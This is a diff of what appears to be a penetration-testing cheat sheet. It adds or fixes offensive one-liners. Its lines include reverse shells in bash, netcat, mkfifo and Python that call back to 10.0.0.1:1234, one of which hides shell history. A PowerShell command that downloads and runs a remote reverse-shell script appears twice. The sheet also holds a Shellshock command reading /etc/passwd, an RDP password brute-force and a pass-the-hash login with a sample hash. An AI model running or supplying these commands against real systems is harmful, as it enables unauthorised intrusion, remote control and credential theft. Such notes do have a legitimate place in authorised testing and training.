@@ -7,7 +7,7 @@ bash -i >& /dev/tcp/10.0.0.1/1234 0>&1
 rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f
 {nc.tradentional|nc|ncat|netcat} 10.0.0.1 1234 {-e|-c} /bin/bash
 python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);s.close()'
-root@kali:$ python -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);os.putenv("HISTFILE","/dev/null");pty.spawn("/bin/bash");s.close()'
+python -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);os.putenv("HISTFILE","/dev/null");pty.spawn("/bin/bash");s.close()'
 one-lin3r
 
 #Upgrade to PTY
@@ -36,7 +36,7 @@ ls /usr/share/webshells/webshells
 ls /usr/share/windows-binaries/privesc
 
 #File Uploading/Downloading
-powershell IEX (New-Object Net.WebClient).DownloadString('http://10.0.0.1/Invoke-PowerShellTcp.ps1
+powershell IEX (New-Object Net.WebClient).DownloadString('http://10.0.0.1/webshells/Invoke-PowerShellTcp.ps1')
 wget http://10.0.0.1/
 cscript wget.vbs http://10.0.0.1/file.exe FILEYOUNEED
 sudo smbserver.py -comment 'Transfer' smb smb
@@ -62,7 +62,7 @@ cadaver http://10.10.10.97:8080/webdav/
 nikto -h 10.10.10.97 -useproxy http://10.10.10.97:4444
 LoginForms - SecLists- Generic-SQLi.txt
 wfuzz -u "http://10.10.10.97/file.php?command=file://FUZZ" -w lfi.list
-wpscan --url http://$10.10.10.97/ --enumerate ap,at,tt,cb,dbe,u,m
+wpscan --url http://10.10.10.97/ --enumerate ap,at,tt,cb,dbe,u,m
 git clone https://github.com/nccgroup/shocker; cd shocker; ./shocker.py -H 10.10.10.97  --command "/bin/cat /etc/passwd" -c /cgi-bin/status --verbose;  ./shocker.py -H 10.10.10.97 --command "/bin/cat /etc/passwd" -c /cgi-bin/admin.cgi --verbose
 
 #135 RPC
@@ -105,6 +105,7 @@ ncrack -vv --user Username -P /usr/share/wordlists/rockyou.txt rdp://10.10.10.97
 #ReverseShells
 cp /usr/share/windows-resources/binaries/nc.exe .
 nc.exe -e cmd 10.0.0.1 1234
+powershell IEX (New-Object Net.WebClient).DownloadString('http://10.0.0.1/webshells/Invoke-PowerShellTcp.ps1')
 
 #PTH Attack
 pth-winexe -U username/Administrator%aad3b435b51404eeaad3b435b51404ee:e0fb1fb85756c24235ff238cbe81fe00 //10.10.10.97 cmd
